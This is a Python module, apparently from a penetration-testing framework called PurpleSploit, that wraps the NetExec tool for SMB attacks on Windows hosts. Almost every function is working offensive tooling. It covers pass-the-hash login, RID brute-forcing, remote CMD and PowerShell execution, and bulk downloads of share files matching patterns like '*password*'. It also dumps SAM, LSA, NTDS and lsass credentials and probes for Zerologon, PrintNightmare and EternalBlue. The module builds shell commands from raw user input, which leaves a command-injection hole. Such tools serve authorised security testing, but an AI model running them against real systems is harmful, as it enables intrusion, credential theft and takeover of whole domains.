"""
NetExec (NXC) SMB Module

SMB protocol operations using NetExec (formerly CrackMapExec).
Comprehensive SMB testing with 40+ granular operations across 6 categories.
"""

from purplesploit.core.module import ExternalToolModule
from typing import Dict, Any, List


class NXCSMBModule(ExternalToolModule):
    """
    NetExec SMB module for SMB protocol testing and exploitation.

    Supports:
    - Authentication testing (standard, PTH, local auth)
    - Enumeration (shares, users, groups, sessions, etc.)
    - Share operations (spider_plus, download, upload)
    - Command execution (CMD, PowerShell)
    - Credential dumping (SAM, LSA, NTDS, lsassy)
    - Vulnerability scanning (MS17-010, Zerologon, PetitPotam, etc.)
    """

    def __init__(self, framework):
        super().__init__(framework)
        self.tool_name = "nxc"

    @property
    def name(self) -> str:
        return "NetExec SMB"

    @property
    def description(self) -> str:
        return "Comprehensive SMB testing with 40+ operations across 6 categories"

    @property
    def author(self) -> str:
        return "PurpleSploit Team"

    @property
    def category(self) -> str:
        return "network"

    @property
    def parameter_profiles(self) -> List[str]:
        """
        Use SMB authentication, shares, and execution profiles.

        This module supports multiple SMB operations, so we include
        all relevant SMB profiles to provide comprehensive parameter coverage.
        """
        return ["smb_auth", "smb_shares", "smb_execution"]

    def _init_parameters(self):
        """Set RHOST as required parameter and add AUTH_TYPE option."""
        super()._init_parameters()
        # Make RHOST required for SMB operations
        if "RHOST" in self.parameters:
            self.parameters["RHOST"].required = True
            self.options["RHOST"]["required"] = True

        # Add AUTH_TYPE option for authentication method selection
        self.options["AUTH_TYPE"] = {
            "value": "domain",
            "required": False,
            "description": "Authentication type: domain, local, kerberos",
            "default": "domain"
        }

    def get_operations(self) -> List[Dict[str, Any]]:
        """
        Get list of SMB operations organized by subcategory.

        Subcategories:
        - authentication: Authentication and credential testing
        - enumeration: Information gathering and reconnaissance
        - shares: Share browsing and file operations
        - execution: Command and script execution
        - credentials: Credential dumping and extraction
        - vulnerability: Vulnerability scanning and exploitation

        Returns:
            List of operation dictionaries with subcategory tags
        """
        return [
            # === Authentication Operations ===
            {"name": "Test Authentication", "description": "Test basic SMB authentication", "handler": "op_test_auth", "subcategory": "authentication"},
            {"name": "Test with Domain", "description": "Test authentication with domain", "handler": "op_test_domain", "subcategory": "authentication"},
            {"name": "Pass-the-Hash", "description": "Authenticate using NTLM hash", "handler": "op_pass_the_hash", "subcategory": "authentication"},
            {"name": "Local Authentication", "description": "Test local authentication (--local-auth)", "handler": "op_local_auth", "subcategory": "authentication"},

            # === Enumeration Operations ===
            {"name": "List Shares", "description": "Enumerate SMB shares", "handler": "op_list_shares", "subcategory": "enumeration"},
            {"name": "Enumerate Users", "description": "Enumerate domain/local users", "handler": "op_enum_users", "subcategory": "enumeration"},
            {"name": "Enumerate Local Users", "description": "Enumerate local users only", "handler": "op_enum_local_users", "subcategory": "enumeration"},
            {"name": "Enumerate Groups", "description": "Enumerate domain groups", "handler": "op_enum_groups", "subcategory": "enumeration"},
            {"name": "Password Policy", "description": "Get domain password policy", "handler": "op_password_policy", "subcategory": "enumeration"},
            {"name": "Active Sessions", "description": "Enumerate active sessions", "handler": "op_active_sessions", "subcategory": "enumeration"},
            {"name": "Logged On Users", "description": "Enumerate logged on users", "handler": "op_loggedon_users", "subcategory": "enumeration"},
            {"name": "RID Bruteforce", "description": "Bruteforce RIDs to enumerate users", "handler": "op_rid_brute", "subcategory": "enumeration"},
            {"name": "List Disks", "description": "List available disks", "handler": "op_list_disks", "subcategory": "enumeration"},
            {"name": "Full Enumeration", "description": "Run all enumeration checks", "handler": "op_full_enum", "subcategory": "enumeration"},

            # === Share Operations ===
            {"name": "Browse & Download (Interactive)", "description": "Spider and download files interactively", "handler": "op_browse_download", "subcategory": "shares"},
            {"name": "Download All Files", "description": "Recursively download all files from shares", "handler": "op_download_all", "subcategory": "shares"},
            {"name": "Download by Pattern", "description": "Download files matching pattern (e.g., *.xlsx)", "handler": "op_download_pattern", "subcategory": "shares"},
            {"name": "Spider Only (No Download)", "description": "List files without downloading", "handler": "op_spider_only", "subcategory": "shares"},
            {"name": "Spider Specific Share", "description": "Spider a specific share name", "handler": "op_spider_share", "subcategory": "shares"},
            {"name": "Download Specific File", "description": "Download file from manual path", "handler": "op_download_file", "subcategory": "shares"},
            {"name": "Upload File", "description": "Upload file to target", "handler": "op_upload_file", "subcategory": "shares"},

            # === Execution Operations ===
            {"name": "Execute Command (CMD)", "description": "Execute Windows command", "handler": "op_exec_cmd", "subcategory": "execution"},
            {"name": "Execute PowerShell", "description": "Execute PowerShell command", "handler": "op_exec_ps", "subcategory": "execution"},
            {"name": "Get System Info", "description": "Run systeminfo command", "handler": "op_system_info", "subcategory": "execution"},
            {"name": "List Processes", "description": "List running processes", "handler": "op_list_processes", "subcategory": "execution"},
            {"name": "Network Configuration", "description": "Get network config (ipconfig)", "handler": "op_network_config", "subcategory": "execution"},
            {"name": "List Administrators", "description": "List local administrators", "handler": "op_list_admins", "subcategory": "execution"},
            {"name": "Check Privileges", "description": "Check current privileges (whoami /priv)", "handler": "op_check_privs", "subcategory": "execution"},

            # === Credential Dumping ===
            {"name": "Dump SAM Database", "description": "Dump SAM hashes (local users)", "handler": "op_dump_sam", "subcategory": "credentials"},
            {"name": "Dump LSA Secrets", "description": "Dump LSA secrets", "handler": "op_dump_lsa", "subcategory": "credentials"},
            {"name": "Dump NTDS (DC Only)", "description": "Dump NTDS.dit from Domain Controller", "handler": "op_dump_ntds", "subcategory": "credentials"},
            {"name": "Dump All (SAM+LSA+NTDS)", "description": "Dump everything", "handler": "op_dump_all", "subcategory": "credentials"},
            {"name": "Lsassy (Memory Dump)", "description": "Dump credentials from lsass memory", "handler": "op_lsassy", "subcategory": "credentials"},
            {"name": "Nanodump", "description": "Nanodump lsass", "handler": "op_nanodump", "subcategory": "credentials"},
            {"name": "WiFi Passwords", "description": "Extract WiFi passwords", "handler": "op_wifi", "subcategory": "credentials"},

            # === Vulnerability Checks ===
            {"name": "MS17-010 (EternalBlue)", "description": "Check for EternalBlue vulnerability", "handler": "op_ms17_010", "subcategory": "vulnerability"},
            {"name": "Zerologon (CVE-2020-1472)", "description": "Check for Zerologon vulnerability", "handler": "op_zerologon", "subcategory": "vulnerability"},
            {"name": "PetitPotam", "description": "Check for PetitPotam vulnerability", "handler": "op_petitpotam", "subcategory": "vulnerability"},
            {"name": "NoPac (CVE-2021-42278)", "description": "Check for NoPac vulnerability", "handler": "op_nopac", "subcategory": "vulnerability"},
            {"name": "SMBGhost (CVE-2020-0796)", "description": "Check for SMBGhost vulnerability", "handler": "op_smbghost", "subcategory": "vulnerability"},
            {"name": "PrintNightmare", "description": "Check for PrintNightmare vulnerability", "handler": "op_printnightmare", "subcategory": "vulnerability"},
            {"name": "All Vulnerability Checks", "description": "Run all vulnerability checks", "handler": "op_all_vulns", "subcategory": "vulnerability"},
        ]

    def _build_auth(self) -> str:
        """Build authentication string for nxc."""
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        hash_val = self.get_option("HASH")

        if not username:
            return ""

        auth = f"-u '{username}'"

        if hash_val:
            auth += f" -H '{hash_val}'"
        elif password:
            auth += f" -p '{password}'"
        else:
            auth += " -p ''"

        return auth

    def _execute_nxc(self, extra_args: str = "") -> Dict[str, Any]:
        """Execute nxc smb command with extra arguments."""
        rhost = self.get_option("RHOST")
        domain = self.get_option("DOMAIN")
        auth_type = self.get_option("AUTH_TYPE") or "domain"
        auth = self._build_auth()

        cmd = f"nxc smb {rhost} {auth}"

        if domain and domain != "WORKGROUP":
            cmd += f" -d {domain}"

        # Add authentication type flags
        if auth_type == "local":
            cmd += " --local-auth"
        elif auth_type == "kerberos":
            cmd += " --kerberos"

        if extra_args:
            cmd += f" {extra_args}"

        return self.execute_command(cmd, timeout=300)

    # ========================================================================
    # Authentication Operations
    # ========================================================================

    def op_test_auth(self) -> Dict[str, Any]:
        """Test basic SMB authentication."""
        return self._execute_nxc()

    def op_test_domain(self) -> Dict[str, Any]:
        """Test authentication with explicit domain."""
        domain = self.get_option("DOMAIN") or input("Domain [default: WORKGROUP]: ") or "WORKGROUP"
        self.set_option("DOMAIN", domain)
        return self._execute_nxc()

    def op_pass_the_hash(self) -> Dict[str, Any]:
        """Authenticate using NTLM hash."""
        hash_val = input("NTLM Hash: ")
        if not hash_val:
            return {"success": False, "error": "Hash required"}

        username = self.get_option("USERNAME") or input("Username: ")
        self.set_option("USERNAME", username)
        self.set_option("HASH", hash_val)
        self.set_option("PASSWORD", None)  # Clear password

        return self._execute_nxc()

    def op_local_auth(self) -> Dict[str, Any]:
        """Test local authentication."""
        return self._execute_nxc("--local-auth")

    # ========================================================================
    # Enumeration Operations
    # ========================================================================

    def op_list_shares(self) -> Dict[str, Any]:
        """List SMB shares."""
        return self._execute_nxc("--shares")

    def op_enum_users(self) -> Dict[str, Any]:
        """Enumerate domain/local users."""
        return self._execute_nxc("--users")

    def op_enum_local_users(self) -> Dict[str, Any]:
        """Enumerate local users only."""
        return self._execute_nxc("--local-users")

    def op_enum_groups(self) -> Dict[str, Any]:
        """Enumerate domain groups."""
        return self._execute_nxc("--groups")

    def op_password_policy(self) -> Dict[str, Any]:
        """Get domain password policy."""
        return self._execute_nxc("--pass-pol")

    def op_active_sessions(self) -> Dict[str, Any]:
        """Enumerate active sessions."""
        return self._execute_nxc("--sessions")

    def op_loggedon_users(self) -> Dict[str, Any]:
        """Enumerate logged on users."""
        return self._execute_nxc("--loggedon-users")

    def op_rid_brute(self) -> Dict[str, Any]:
        """RID bruteforce to enumerate users."""
        return self._execute_nxc("--rid-brute")

    def op_list_disks(self) -> Dict[str, Any]:
        """List available disks."""
        return self._execute_nxc("--disks")

    def op_full_enum(self) -> Dict[str, Any]:
        """Run all enumeration checks."""
        return self._execute_nxc("--users --groups --shares --sessions --pass-pol --disks")

    # ========================================================================
    # Share Operations
    # ========================================================================

    def op_browse_download(self) -> Dict[str, Any]:
        """Spider and download files interactively."""
        share = input("Share name (leave empty for all): ")
        pattern = input("File pattern (e.g., *.xlsx, or empty for all): ")

        module_opts = "DOWNLOAD_FLAG=True MAX_FILE_SIZE=512000"
        if share:
            module_opts += f" SHARE='{share}'"
        if pattern:
            module_opts += f" PATTERN='{pattern}'"

        self.log("Files will be downloaded to: ~/.nxc/modules/nxc_spider_plus/", "info")
        return self._execute_nxc(f"-M spider_plus -o {module_opts}")

    def op_download_all(self) -> Dict[str, Any]:
        """Download all files recursively."""
        confirm = input("This will download ALL files from all shares. Continue? (y/n): ")
        if confirm.lower() != 'y':
            return {"success": False, "error": "Operation cancelled"}

        self.log("Files will be downloaded to: ~/.nxc/modules/nxc_spider_plus/", "info")
        return self._execute_nxc("-M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=512000")

    def op_download_pattern(self) -> Dict[str, Any]:
        """Download files matching pattern."""
        pattern = input("File pattern (e.g., *.xlsx, *password*, *cred*): ")
        if not pattern:
            return {"success": False, "error": "Pattern required"}

        self.log(f"Downloading files matching: {pattern}", "info")
        self.log("Files will be saved to: ~/.nxc/modules/nxc_spider_plus/", "info")
        return self._execute_nxc(f"-M spider_plus -o DOWNLOAD_FLAG=True PATTERN='{pattern}' MAX_FILE_SIZE=512000")

    def op_spider_only(self) -> Dict[str, Any]:
        """List files without downloading."""
        share = input("Share name (leave empty for all): ")
        pattern = input("File pattern (leave empty for all): ")

        module_opts = ""
        if share:
            module_opts += f"SHARE='{share}'"
        if pattern:
            module_opts += f" PATTERN='{pattern}'"

        cmd = f"-M spider_plus"
        if module_opts:
            cmd += f" -o {module_opts}"

        self.log("File list will be saved to: ~/.nxc/modules/nxc_spider_plus/", "info")
        return self._execute_nxc(cmd)

    def op_spider_share(self) -> Dict[str, Any]:
        """Spider a specific share."""
        share = input("Share name: ")
        if not share:
            return {"success": False, "error": "Share name required"}

        download = input("Download files? (y/n) [default: n]: ")
        if download.lower() == 'y':
            return self._execute_nxc(f"-M spider_plus -o SHARE='{share}' DOWNLOAD_FLAG=True MAX_FILE_SIZE=512000")
        else:
            return self._execute_nxc(f"-M spider_plus -o SHARE='{share}'")

    def op_download_file(self) -> Dict[str, Any]:
        """Download specific file from manual path."""
        self.log("Remote path must use Windows format with double backslashes", "info")
        self.log("Example: \\\\Windows\\\\Temp\\\\passwords.txt", "info")

        remote_path = input("Remote path: ")
        local_path = input("Local path (where to save): ")

        if not remote_path or not local_path:
            return {"success": False, "error": "Both paths required"}

        return self._execute_nxc(f"--get-file '{remote_path}' '{local_path}'")

    def op_upload_file(self) -> Dict[str, Any]:
        """Upload file to target."""
        local_path = input("Local path (file to upload): ")

        self.log("Remote path must use Windows format with double backslashes", "info")
        self.log("Example: \\\\Windows\\\\Temp\\\\file.txt", "info")

        remote_path = input("Remote path: ")

        if not remote_path or not local_path:
            return {"success": False, "error": "Both paths required"}

        return self._execute_nxc(f"--put-file '{local_path}' '{remote_path}'")

    # ========================================================================
    # Execution Operations
    # ========================================================================

    def op_exec_cmd(self) -> Dict[str, Any]:
        """Execute Windows command."""
        cmd = input("Command to execute: ")
        if not cmd:
            return {"success": False, "error": "Command required"}

        return self._execute_nxc(f"-x '{cmd}'")

    def op_exec_ps(self) -> Dict[str, Any]:
        """Execute PowerShell command."""
        ps_cmd = input("PowerShell command: ")
        if not ps_cmd:
            return {"success": False, "error": "Command required"}

        return self._execute_nxc(f"-X '{ps_cmd}'")

    def op_system_info(self) -> Dict[str, Any]:
        """Get system information."""
        return self._execute_nxc("-x 'systeminfo'")

    def op_list_processes(self) -> Dict[str, Any]:
        """List running processes."""
        return self._execute_nxc("-x 'tasklist /v'")

    def op_network_config(self) -> Dict[str, Any]:
        """Get network configuration."""
        return self._execute_nxc("-x 'ipconfig /all'")

    def op_list_admins(self) -> Dict[str, Any]:
        """List local administrators."""
        return self._execute_nxc("-x 'net localgroup administrators'")

    def op_check_privs(self) -> Dict[str, Any]:
        """Check current privileges."""
        return self._execute_nxc("-x 'whoami /priv'")

    # ========================================================================
    # Credential Dumping Operations
    # ========================================================================

    def op_dump_sam(self) -> Dict[str, Any]:
        """Dump SAM database."""
        return self._execute_nxc("--sam")

    def op_dump_lsa(self) -> Dict[str, Any]:
        """Dump LSA secrets."""
        return self._execute_nxc("--lsa")

    def op_dump_ntds(self) -> Dict[str, Any]:
        """Dump NTDS from Domain Controller."""
        self.log("This operation is for Domain Controllers only", "warning")
        self.log("This may take a while on large domains...", "info")
        return self._execute_nxc("--ntds")

    def op_dump_all(self) -> Dict[str, Any]:
        """Dump everything (SAM+LSA+NTDS)."""
        return self._execute_nxc("--sam --lsa --ntds")

    def op_lsassy(self) -> Dict[str, Any]:
        """Dump credentials from lsass memory."""
        return self._execute_nxc("-M lsassy")

    def op_nanodump(self) -> Dict[str, Any]:
        """Nanodump lsass."""
        return self._execute_nxc("-M nanodump")

    def op_wifi(self) -> Dict[str, Any]:
        """Extract WiFi passwords."""
        return self._execute_nxc("-M wifi")

    # ========================================================================
    # Vulnerability Checks
    # ========================================================================

    def op_ms17_010(self) -> Dict[str, Any]:
        """Check for MS17-010 (EternalBlue)."""
        self.log("Checking for MS17-010 (EternalBlue) vulnerability", "info")
        # MS17-010 doesn't require auth
        rhost = self.get_option("RHOST")
        return self.execute_command(f"nxc smb {rhost} -M ms17-010")

    def op_zerologon(self) -> Dict[str, Any]:
        """Check for Zerologon vulnerability."""
        self.log("Checking for Zerologon (CVE-2020-1472)", "warning")
        return self._execute_nxc("-M zerologon")

    def op_petitpotam(self) -> Dict[str, Any]:
        """Check for PetitPotam vulnerability."""
        return self._execute_nxc("-M petitpotam")

    def op_nopac(self) -> Dict[str, Any]:
        """Check for NoPac vulnerability."""
        return self._execute_nxc("-M nopac")

    def op_smbghost(self) -> Dict[str, Any]:
        """Check for SMBGhost vulnerability."""
        self.log("Checking for SMBGhost (CVE-2020-0796)", "info")
        rhost = self.get_option("RHOST")
        return self.execute_command(f"nxc smb {rhost} -M smbghost")

    def op_printnightmare(self) -> Dict[str, Any]:
        """Check for PrintNightmare vulnerability."""
        return self._execute_nxc("-M printnightmare")

    def op_all_vulns(self) -> Dict[str, Any]:
        """Run all vulnerability checks."""
        self.log("Running all vulnerability checks...", "info")
        rhost = self.get_option("RHOST")
        auth = self._build_auth()

        results = []
        vulns = ["ms17-010", "smbghost"]  # No auth required
        auth_vulns = ["zerologon", "petitpotam", "nopac", "printnightmare"]  # Auth required

        # Run non-auth checks
        for vuln in vulns:
            self.log(f"Checking {vuln}...", "info")
            result = self.execute_command(f"nxc smb {rhost} -M {vuln}")
            results.append({vuln: result})

        # Run auth-required checks
        if auth:
            for vuln in auth_vulns:
                self.log(f"Checking {vuln}...", "info")
                result = self.execute_command(f"nxc smb {rhost} {auth} -M {vuln}")
                results.append({vuln: result})

        return {
            "success": True,
            "output": "Vulnerability scan complete",
            "results": results
        }

    def run(self) -> Dict[str, Any]:
        """
        This should not be called directly since module has operations.
        But included as fallback for basic auth test.
        """
        return self.op_test_auth()
